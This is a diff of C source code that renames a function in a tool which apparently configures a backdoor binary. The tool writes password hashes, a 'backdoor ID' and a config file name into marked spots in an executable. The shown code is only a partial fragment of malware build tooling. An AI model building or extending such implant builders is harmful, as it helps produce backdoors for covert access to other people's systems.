@@ -6,7 +6,7 @@
 #include "peutils.h"
 #include "polymer.h"
 
-bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
+bool EmbedConfig(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
 extern BOOL SignMobileComponent(TCHAR *wsFile, TCHAR *wsCert);
 
 int _tmain(int argc, _TCHAR* argv[])
@@ -106,7 +106,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	// Patching Passwod dei log
 	MD5((const UCHAR *)szLogPassword, strlen(szLogPassword) , (PUCHAR) bufmd5);
-	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_LOG_PASS_MARK, AES_PASS_MARK_LEN))
+	if (EmbedConfig(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_LOG_PASS_MARK, AES_PASS_MARK_LEN))
 		printf("Password embedded... ok\n");
 	else {
 		printf("Cannot embed Log Password [%S]\n", wsOutFile);
@@ -116,7 +116,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	// Patching Passwod della conf
 	MD5((const UCHAR *)szConfPassword, strlen(szConfPassword) , (PUCHAR) bufmd5);
-	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_CONF_PASS_MARK, AES_PASS_MARK_LEN))
+	if (EmbedConfig(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_CONF_PASS_MARK, AES_PASS_MARK_LEN))
 		printf("Password embedded... ok\n");
 	else {
 		printf("Cannot embed Conf Password [%S]\n", wsOutFile);
@@ -126,7 +126,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	// Patching Passwod del protocollo
 	MD5((const UCHAR *)szChanPassword, strlen(szChanPassword) , (PUCHAR) bufmd5);
-	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, CHAN_PASS_LEN, CHAN_PASS_MARK, CHAN_PASS_MARK_LEN))
+	if (EmbedConfig(pBlockPtr, iLen, (BYTE *) bufmd5, CHAN_PASS_LEN, CHAN_PASS_MARK, CHAN_PASS_MARK_LEN))
 		printf("Channel Password embedded... ok\n");
 	else {
 		printf("Cannot embed Channel Password [%S]\n", wsOutFile);
@@ -135,7 +135,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	}
 
 	// Patching  backdoor ID
-	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) szBackdoorId, BACKDOOR_ID_LEN, BACKDOOR_ID_MARK, BACKDOOR_ID_LEN))
+	if (EmbedConfig(pBlockPtr, iLen, (BYTE *) szBackdoorId, BACKDOOR_ID_LEN, BACKDOOR_ID_MARK, BACKDOOR_ID_LEN))
 		printf("Backdoor_id embedded... ok\n");
 	else {
 		printf("Cannot embed Backdoor_id [%S]\n", wsOutFile);
@@ -144,7 +144,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	}
 
 	// Patching nome file configurazione
-	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) CONFIG_FILENAME, wcslen(CONFIG_FILENAME) * sizeof(WCHAR), CONFIG_NAME_MARK, CONFIG_NAME_MARK_LEN))
+	if (EmbedConfig(pBlockPtr, iLen, (BYTE *) CONFIG_FILENAME, wcslen(CONFIG_FILENAME) * sizeof(WCHAR), CONFIG_NAME_MARK, CONFIG_NAME_MARK_LEN))
 		printf("Config name embedded... ok\n");
 	else {
 		printf("Cannot embed Config Name [%S]\n", wsOutFile);
@@ -175,7 +175,7 @@ int _tmain(int argc, _TCHAR* argv[])
 }
 
 
-bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len)
+bool EmbedConfig(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len)
 {
 	BYTE *pDataSect	= NULL;
 	bool iRet = false;
